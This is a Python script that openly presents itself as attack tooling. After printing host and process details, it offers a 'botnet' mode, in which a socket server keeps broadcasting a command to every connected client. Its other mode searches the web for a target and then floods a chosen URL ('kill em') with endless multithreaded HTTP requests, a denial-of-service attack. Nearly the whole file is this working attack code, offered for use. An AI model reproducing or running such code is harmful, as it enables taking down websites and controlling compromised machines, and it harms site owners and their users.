import time
import threading
import socket
import requests
import platform
import psutil
import sys
import mechanicalsoup

jan = platform.node()
jani09 = platform.system()
urrr = platform.architecture()
rur43 = platform.machine()
jp06 = platform.version()

print("Jan " + str(jan))
print("OS: " + jani09)
print("Machine: " + rur43)
print("Vers. " + jp06)
print(urrr)

def server(addr, port, cmd):
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  
  rovaja21 = addr
  leeroy09 = port
  l09 = int(leeroy09)
  print("up", rovaja21, ":", leeroy09)
  server_address = (rovaja21, l09)
  sock.bind(server_address)
  
  sock.listen(1)
  
  clients = []
  
  def handle_client(client_socket):
      while True:
          try:
              data = client_socket.recv(1024)
              if data:
                  for c in clients:
                      if c != client_socket:
                          c.sendall(data)
              else:
                  clients.remove(client_socket)
                  break
          except:
              clients.remove(client_socket)
              client_socket.close()
              break
  
  def send_code():
      while True:
          code = cmd
          for client in clients:
              client.sendall(code.encode())
  
  threading.Thread(target=send_code).start()
  
  while True:
      try:
          client_socket, client_address = sock.accept()
  
          clients.append(client_socket)
  
          t = threading.Thread(target=handle_client, args=(client_socket,))
          t.start()
          print(clients)
          print("+")
      except socket.error as e:
          print(f"@w@ {e}")
      except KeyboardInterrupt:
          print("bai :3")
          sock.close()
          sys.exit()
      except OSError as e:
          print(f"@w@ {e}")
          sock.close()
          sys.exit()
      except Exception as e:
          print(f"???? wtf {e}")
          sock.close()
          sys.exit()
          print(clients)
          print("-")

def get_website_contents(url):
    browser = mechanicalsoup.StatefulBrowser()
    browser.open(url)
    with open("contents.txt", "a") as f:
      f.write(url + ":\n")
      f.write(browser.get_current_page().prettify())
      f.close

def search(search):
    browser = mechanicalsoup.StatefulBrowser(user_agent="")
    browser.open("https://duckduckgo.com/")
    browser.select_form('#search_form_homepage')
    browser["q"] = f"{search}"
    browser.submit_selected()

    for link in browser.page.select('a.result__a'):
        print(link.text, '->', link.attrs['href'])
        get_website_contents(link.attrs['href'])
  
def connect_to_website(url):
  while True:
    r0 = time.time()
    r1 = requests.get(url)
    j34 = time.time()
    r2 = requests.get(url)
    b6 = time.time()

    e1 = j34 - r0
    e2 = b6 - j34
    print(f'The website took {e1:.2f} seconds to load.')
    print(f"Connected to {url} with status code: {r1.status_code}")
    print(f'The website took {e2:.2f} seconds to load.')
    print(f"Connected to {url} with status code: {r2.status_code}")

def main(num_threads, url):
    threads = []
    for i in range(num_threads):
        t = threading.Thread(target=connect_to_website, args=(url,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    for proc in psutil.process_iter(['pid', 'name']):
        print(proc.info)
    
    cpu_percent = psutil.cpu_percent()
    
    memory = psutil.virtual_memory()
    mem_used_percent = memory.percent
    mem_used = round(memory.used / (1024*1024), 2)
    mem_total = round(memory.total / (1024*1024), 2)
    
    disk_usage = psutil.disk_usage('/')
    disk_used_percent = disk_usage.percent
    disk_used = round(disk_usage.used / (1024*1024*1024), 2)
    disk_total = round(disk_usage.total / (1024*1024*1024), 2)


    print(f"CPU Usage: {cpu_percent}%")
    print(f"Memory Usage: {mem_used_percent}% ({mem_used} MB used / {mem_total} MB total)")
    print(f"Disk Usage: {disk_used_percent}% ({disk_used} GB used / {disk_total} GB total)")
    print("woooowooooowwowowooooww")
    print("use replit 4 so op")
    u7 = input("botnet y/n ")
    if u7 == "y":
      print("sex")
      f3 = input("address ")
      f4 = input("port ")
      f5 = input("cmdfile ")
      try:
        server(f3, f4, f5)
        print("^^")
      except:
        print("@w@")
    elif u7 == "n":
      z7 = input("find those guys ")
      z8 = search(z7)
      b5 = input("kill em ")
      z1 = input("how much ")
      z2 = int(z1)
      url = b5
    
      main(z2, url)
